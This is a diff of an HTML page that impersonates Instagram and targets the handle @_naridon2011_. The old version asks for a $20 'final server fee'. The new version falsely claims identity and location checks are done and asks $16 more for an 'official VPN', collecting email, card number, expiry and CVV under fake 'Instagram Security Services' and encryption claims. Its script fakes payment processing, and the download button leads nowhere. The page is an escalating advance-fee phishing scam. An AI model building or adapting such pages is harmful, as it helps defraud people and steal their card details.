@@ -2,12 +2,10 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Instagram Location Verification</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"
-        rel="stylesheet" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Verification & VPN Activation</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             box-sizing: border-box;
@@ -16,129 +14,248 @@
         }
 
         body {
-            font-family: 'Poppins', sans-serif;
-            background-color: #fafafa;
-            padding: 30px 10px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
             color: #333;
         }
 
         .container {
             max-width: 500px;
-            margin: auto;
-            background: #fff;
-            border-radius: 16px;
-            padding: 30px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            margin: 20px auto;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
+        }
+
+        .header {
+            background: linear-gradient(90deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
+            color: white;
+            padding: 30px 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .header::after {
+            content: "";
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            right: 0;
+            height: 20px;
+            background: white;
+            border-radius: 20px 20px 0 0;
         }
 
         .logo {
             display: flex;
             align-items: center;
             justify-content: center;
-            margin-bottom: 20px;
+            margin-bottom: 15px;
         }
 
         .logo-icon {
-            font-size: 40px;
-            color: #e1306c;
+            font-size: 36px;
+            margin-right: 10px;
         }
 
         .logo-text {
-            font-size: 22px;
+            font-size: 24px;
+            font-weight: 700;
+        }
+
+        .status-card {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            padding: 15px;
+            margin: 20px auto;
+            max-width: 90%;
+            backdrop-filter: blur(5px);
+        }
+
+        .status-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .status-item:last-child {
+            border-bottom: none;
+        }
+
+        .status-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+        }
+
+        .status-icon i {
+            color: #E1306C;
+            font-size: 18px;
+        }
+
+        .status-text {
+            flex: 1;
+        }
+
+        .status-title {
             font-weight: 600;
-            margin-left: 10px;
-            color: #222;
-        }
-
-        .product-title {
-            font-size: 22px;
-            text-align: center;
-            margin-bottom: 10px;
-        }
-
-        .product-description {
-            text-align: center;
             font-size: 16px;
-            color: #555;
-            margin-bottom: 25px;
+        }
+
+        .status-desc {
+            font-size: 13px;
+            opacity: 0.9;
         }
 
         .profile-section {
+            padding: 25px 20px 15px;
             text-align: center;
-            margin-bottom: 30px;
+        }
+
+        .profile-pic {
+            width: 100px;
+            height: 100px;
+            border-radius: 50%;
+            border: 3px solid white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            margin: 0 auto 15px;
+            overflow: hidden;
         }
 
         .profile-pic img {
-            width: 90px;
-            height: 90px;
-            border-radius: 50%;
+            width: 100%;
+            height: 100%;
             object-fit: cover;
-            margin-bottom: 10px;
         }
 
         .profile-name {
-            font-size: 18px;
-            font-weight: 600;
-            margin-bottom: 10px;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 5px;
+            color: #2c3e50;
         }
 
         .profile-stats {
             display: flex;
-            justify-content: space-around;
-            font-size: 14px;
+            justify-content: center;
+            margin: 15px 0;
         }
 
         .stat {
-            text-align: center;
+            padding: 0 15px;
         }
 
         .stat-value {
-            font-weight: bold;
+            font-weight: 700;
             font-size: 18px;
-            color: #000;
+            color: #E1306C;
         }
 
         .stat-label {
-            color: #777;
+            font-size: 13px;
+            color: #7f8c8d;
         }
 
-        .price-container {
+        .divider {
+            height: 1px;
+            background: #ecf0f1;
+            margin: 20px 0;
+        }
+
+        .section-title {
             text-align: center;
-            margin-bottom: 30px;
+            font-size: 22px;
+            color: #2c3e50;
+            margin: 20px 0 15px;
+            font-weight: 700;
+        }
+
+        .section-desc {
+            text-align: center;
+            color: #7f8c8d;
+            padding: 0 30px;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+
+        .vpn-container {
+            padding: 20px;
+        }
+
+        .vpn-features {
+            display: flex;
+            flex-wrap: wrap;
+            margin: 20px 0;
+            justify-content: center;
+        }
+
+        .feature {
+            width: 45%;
+            margin: 10px;
+            padding: 15px;
+            background: #f8f9fe;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .feature-icon {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 10px;
+        }
+
+        .feature-icon i {
+            color: white;
+            font-size: 20px;
+        }
+
+        .feature-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: #2c3e50;
+        }
+
+        .pricing {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            color: white;
+            margin: 20px 0;
         }
 
         .price-label {
             font-size: 16px;
-            font-weight: 500;
-        }
-
-        .price {
-            font-size: 32px;
-            font-weight: 700;
-            margin-top: 5px;
             margin-bottom: 5px;
         }
 
-        .billing-cycle {
-            font-size: 13px;
-            color: #888;
+        .price {
+            font-size: 42px;
+            font-weight: 800;
+            margin-bottom: 5px;
         }
 
-        .benefits {
-            margin-bottom: 30px;
+        .price-note {
+            font-size: 14px;
+            opacity: 0.9;
         }
 
-        .benefit {
-            display: flex;
-            align-items: center;
-            margin-bottom: 10px;
-            font-size: 15px;
-            color: #444;
-        }
-
-        .benefit i {
-            color: #4CAF50;
-            margin-right: 10px;
+        .form-container {
+            padding: 20px;
         }
 
         .form-group {
@@ -146,243 +263,412 @@
         }
 
         .form-group label {
-            font-weight: 500;
             display: block;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #2c3e50;
         }
 
         .form-control {
             width: 100%;
-            padding: 10px 12px;
-            font-size: 14px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: border 0.3s;
+        }
+
+        .form-control:focus {
+            border-color: #667eea;
+            outline: none;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .btn i {
+            margin-right: 10px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(90deg, #E1306C, #C13584);
+            color: white;
+            box-shadow: 0 5px 15px rgba(225, 48, 108, 0.4);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(225, 48, 108, 0.6);
+        }
+
+        .btn-primary:active {
+            transform: translateY(0);
         }
 
         .checkbox-group {
             display: flex;
             align-items: flex-start;
-            font-size: 13px;
-            margin-bottom: 20px;
+            margin: 20px 0;
         }
 
         .checkbox-group input {
-            margin-top: 2px;
+            margin-top: 4px;
             margin-right: 10px;
         }
 
-        .checkbox-group a {
-            color: #007BFF;
+        .terms-text {
+            font-size: 14px;
+            color: #7f8c8d;
+        }
+
+        .terms-text a {
+            color: #667eea;
             text-decoration: none;
-        }
-
-        .btn {
-            background-color: #e1306c;
-            color: white;
-            padding: 12px;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
             font-weight: 600;
-            cursor: pointer;
-            width: 100%;
         }
 
-        .btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-        }
-
-        .secure-payment {
+        .secure-note {
+            text-align: center;
+            font-size: 14px;
+            color: #7f8c8d;
+            margin: 15px 0;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 13px;
-            color: #555;
-            margin-top: 10px;
         }
 
-        .secure-payment i {
-            margin-right: 6px;
-            color: #4CAF50;
-        }
-
-        .payment-icons {
-            text-align: center;
-            margin-top: 10px;
-        }
-
-        .payment-icon {
-            font-size: 28px;
-            margin: 0 5px;
-            color: #555;
-        }
-
-        .guarantee {
-            margin-top: 20px;
-            background: #f8f8f8;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 13px;
-            display: flex;
-            align-items: flex-start;
-        }
-
-        .guarantee i {
+        .secure-note i {
             color: #4CAF50;
             margin-right: 8px;
-            margin-top: 2px;
         }
 
-        .guarantee-text {
-            flex: 1;
-            color: #555;
+        .result-section {
+            display: none;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .result-icon {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: #e8f5e9;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .result-icon i {
+            color: #4CAF50;
+            font-size: 40px;
+        }
+
+        .result-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #2c3e50;
+            margin-bottom: 15px;
+        }
+
+        .result-text {
+            color: #7f8c8d;
+            margin-bottom: 25px;
+            padding: 0 20px;
+            line-height: 1.6;
+        }
+
+        .code-container {
+            background: #2c3e50;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .code-label {
+            color: #bdc3c7;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .code {
+            font-size: 36px;
+            font-weight: 800;
+            letter-spacing: 5px;
+            color: white;
+            font-family: monospace;
+        }
+
+        .download-btn {
+            display: inline-flex;
+            align-items: center;
+            padding: 15px 30px;
+            background: linear-gradient(90deg, #00c853, #00e676);
+            color: white;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 18px;
+            margin-top: 15px;
+            box-shadow: 0 5px 15px rgba(0, 200, 83, 0.4);
+            transition: all 0.3s;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 200, 83, 0.6);
+        }
+
+        .download-btn i {
+            margin-right: 10px;
+        }
+
+        .note-box {
+            background: #fff8e1;
+            border-radius: 12px;
+            padding: 15px;
+            margin-top: 25px;
+            border-left: 4px solid #ffc107;
+        }
+
+        .note-title {
+            font-weight: 700;
+            margin-bottom: 8px;
+            color: #2c3e50;
+        }
+
+        .note-text {
+            font-size: 14px;
+            color: #7f8c8d;
+            line-height: 1.5;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #7f8c8d;
+            font-size: 13px;
+            border-top: 1px solid #ecf0f1;
         }
     </style>
 </head>
 
 <body>
     <div class="container">
-        <div class="logo">
-            <i class="fab fa-instagram logo-icon"></i>
-            <div class="logo-text">Final Payment - Server Fee!</div>
+        <div class="header">
+            <div class="logo">
+                <i class="fab fa-instagram logo-icon"></i>
+                <div class="logo-text">Last and Final payment to get vpn download Link</div>
+            </div>
+
+            <div class="status-card">
+                <div class="status-item">
+                    <div class="status-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="status-text">
+                        <div class="status-title">Identity Verified</div>
+                        <div class="status-desc">Your identity has been confirmed</div>
+                    </div>
+                </div>
+                <div class="status-item">
+                    <div class="status-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="status-text">
+                        <div class="status-title">Location Verified</div>
+                        <div class="status-desc">Your location has been confirmed</div>
+                    </div>
+                </div>
+                <div class="status-item">
+                    <div class="status-icon">
+                        <i class="fas fa-check"></i>
+                    </div>
+                    <div class="status-text">
+                        <div class="status-title">Server Fee Paid</div>
+                        <div class="status-desc">$20 server fee has been processed</div>
+                    </div>
+                </div>
+            </div>
         </div>
-
-        <h1 class="product-title">Location Successfully Verified</h1>
-
-        <p class="product-description">Your location has been successfully verified. To complete activation and cover
-            server costs, please submit the final payment of $20 USD.</p>
 
         <div class="profile-section">
             <div class="profile-pic">
-                <img src="/img.jpg" alt="Profile Picture" />
+                <img src="/img.jpg" alt="Profile">
             </div>
 
-            <div class="profile-name" id="profileName">@_naridon2011_</div>
+            <div class="profile-name">@_naridon2011_</div>
 
             <div class="profile-stats">
                 <div class="stat">
-                    <div class="stat-value" id="postsValue">0</div>
-                    <div class="stat-label">Posts</div>
+                    <div class="stat-value">0</div>
+                    <div class="stat-label">POSTS</div>
                 </div>
                 <div class="stat">
-                    <div class="stat-value" id="followersValue">70</div>
-                    <div class="stat-label">Followers</div>
+                    <div class="stat-value">70</div>
+                    <div class="stat-label">FOLLOWERS</div>
                 </div>
                 <div class="stat">
-                    <div class="stat-value" id="followingValue">103</div>
-                    <div class="stat-label">Following</div>
+                    <div class="stat-value">103</div>
+                    <div class="stat-label">FOLLOWING</div>
                 </div>
             </div>
         </div>
 
-        <div class="price-container">
-            <div class="price-label">Final Server Fee</div>
-            <div class="price">$20<span style="font-size: 24px"> USD</span></div>
-            <div class="billing-cycle">No recurring charges • Instant activation</div>
+        <div class="divider"></div>
+
+        <h2 class="section-title">Secure VPN Required</h2>
+        <p class="section-desc">To complete your account security and access all features, you need to install our
+            official VPN</p>
+
+        <div class="vpn-container">
+            <div class="vpn-features">
+                <div class="feature">
+                    <div class="feature-icon">
+                        <i class="fas fa-lock"></i>
+                    </div>
+                    <div class="feature-text">256-bit Encryption</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <div class="feature-text">High Speed</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">
+                        <i class="fas fa-globe"></i>
+                    </div>
+                    <div class="feature-text">Global Access</div>
+                </div>
+                <div class="feature">
+                    <div class="feature-icon">
+                        <i class="fas fa-user-shield"></i>
+                    </div>
+                    <div class="feature-text">No Logs Policy</div>
+                </div>
+            </div>
+
+            <div class="pricing">
+                <div class="price-label">ONE-TIME PAYMENT</div>
+                <div class="price">$16</div>
+                <div class="price-note">No recurring fees - Lifetime access</div>
+            </div>
         </div>
 
-        <div class="benefits">
-            <div class="benefit">
-                <i class="fas fa-globe-americas"></i>
-                <span>Access all Instagram features without restrictions</span>
-            </div>
-            <div class="benefit">
-                <i class="fas fa-shield-alt"></i>
-                <span>Secure your account from unauthorized activity</span>
-            </div>
-            <div class="benefit">
+        <div class="form-container">
+            <form id="paymentForm">
+                <div class="form-group">
+                    <label for="email">Your Email Address</label>
+                    <input type="email" id="email" class="form-control" placeholder="Enter your Instagram email"
+                        required>
+                </div>
+
+                <div class="form-group">
+                    <label for="card">Card Information</label>
+                    <input type="text" id="card" class="form-control" placeholder="1234 1234 1234 1234" required>
+                </div>
+
+                <div style="display: flex; gap: 15px;">
+                    <div class="form-group" style="flex: 1;">
+                        <label for="expiry">Expiry Date</label>
+                        <input type="text" id="expiry" class="form-control" placeholder="MM/YY" required>
+                    </div>
+                    <div class="form-group" style="flex: 1;">
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" class="form-control" placeholder="123" required>
+                    </div>
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="terms" required>
+                    <label for="terms" class="terms-text">I agree to the <a href="#">Terms of Service</a> and authorize
+                        the $16 payment for VPN access</label>
+                </div>
+
+                <button type="submit" class="btn btn-primary">
+                    <i class="fas fa-lock"></i> Get vpn download link - $16
+                </button>
+
+                <div class="secure-note">
+                    <i class="fas fa-shield-alt"></i> Secure payment encrypted with 256-bit SSL
+                </div>
+            </form>
+        </div>
+
+        <div class="result-section" id="resultSection">
+            <div class="result-icon">
                 <i class="fas fa-check-circle"></i>
-                <span>One-time payment — no hidden fees</span>
             </div>
-            <div class="benefit">
-                <i class="fas fa-lock"></i>
-                <span>256-bit encrypted transaction</span>
+            <h2 class="result-title">VPN Purchase Complete!</h2>
+            <p class="result-text">Your VPN has been successfully activated. Download the application and use the
+                activation code below to get started.</p>
+
+            <div class="code-container">
+                <div class="code-label">Your Activation Code</div>
+                <div class="code" id="activationCode">000000</div>
+            </div>
+
+            <a href="#" class="download-btn" id="downloadBtn">
+                <i class="fas fa-download"></i> Download VPN Application
+            </a>
+
+            <div class="note-box">
+                <div class="note-title">Important Note</div>
+                <p class="note-text">You will need to enter the 6-digit activation code when you first launch the VPN
+                    application. This code will expire in 24 hours.</p>
             </div>
         </div>
 
-        <form id="checkoutForm">
-            <div class="form-group">
-                <label for="email">Email Address</label>
-                <input type="email" id="email" class="form-control" placeholder="Your Instagram account email"
-                    required />
-            </div>
-
-            <div class="checkbox-group">
-                <input type="checkbox" id="terms" required />
-                <label for="terms">I agree to the <a href="#">Terms of Service</a> and understand this is a one-time $20
-                    USD
-                    payment for final server processing.</label>
-            </div>
-
-            <button type="submit" class="btn">
-                <i class="fas fa-credit-card"></i> Pay Final Fee - $20 USD
-            </button>
-
-            <div class="secure-payment">
-                <i class="fas fa-lock"></i>
-                <span>Secure Payment • 256-bit Encryption</span>
-            </div>
-
-            <div class="payment-icons">
-                <i class="fab fa-cc-visa payment-icon"></i>
-                <i class="fab fa-cc-mastercard payment-icon"></i>
-                <i class="fab fa-cc-amex payment-icon"></i>
-                <i class="fab fa-cc-paypal payment-icon"></i>
-                <i class="fab fa-cc-apple-pay payment-icon"></i>
-            </div>
-
-            <div class="guarantee">
-                <i class="fas fa-shield-alt"></i>
-                <div class="guarantee-text">
-                    <strong>Money-back guarantee:</strong> If activation fails, a full refund will be processed within
-                    24 hours.
-                </div>
-            </div>
-        </form>
+        <div class="footer">
+            <p>© 2023 Instagram Security Services. All rights reserved.</p>
+            <p>This is a secure portal. Your data is protected by 256-bit encryption.</p>
+        </div>
     </div>
 
     <script>
-        // Profile data
-        const profileData = {
-            username: "_naridon2011_",
-            posts: 0,
-            followers: 70,
-            following: 103
-        };
-
-        document.getElementById('profileName').textContent = "@" + profileData.username;
-        document.getElementById('postsValue').textContent = profileData.posts;
-        document.getElementById('followersValue').textContent = profileData.followers;
-        document.getElementById('followingValue').textContent = profileData.following;
-
-        // Form submission
-        document.getElementById('checkoutForm').addEventListener('submit', function (e) {
+        document.getElementById('paymentForm').addEventListener('submit', function (e) {
             e.preventDefault();
 
-            const email = document.getElementById('email').value;
-
-            if (!email) {
-                alert('Please enter your email address.');
-                return;
-            }
-
-            if (!/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(email)) {
-                alert('Please enter a valid email address.');
-                return;
-            }
-
-            const btn = document.querySelector('.btn');
+            // Show loading state
+            const btn = document.querySelector('.btn-primary');
             const originalText = btn.innerHTML;
-            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing payment...';
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing Payment...';
             btn.disabled = true;
 
+            // Simulate payment processing
             setTimeout(() => {
-                alert("Location has been successfully verified. Now you have to pay $20 USD as the final payment for server fee.");
+                // Generate a random 6-digit code
+                const code = Math.floor(100000 + Math.random() * 900000);
+                document.getElementById('activationCode').textContent = code;
+
+                // Show result section
+                // document.getElementById('resultSection').style.display = 'block';
+
+                // Scroll to results
+                document.getElementById('resultSection').scrollIntoView({ behavior: 'smooth' });
+
+                // Reset button
                 btn.innerHTML = originalText;
                 btn.disabled = false;
-                document.getElementById('checkoutForm').reset();
             }, 2500);
+        });
+
+        // Handle download button
+        document.getElementById('downloadBtn').addEventListener('click', function (e) {
+            e.preventDefault();
+            alert("You're not logged in!");
         });
     </script>
 </body>
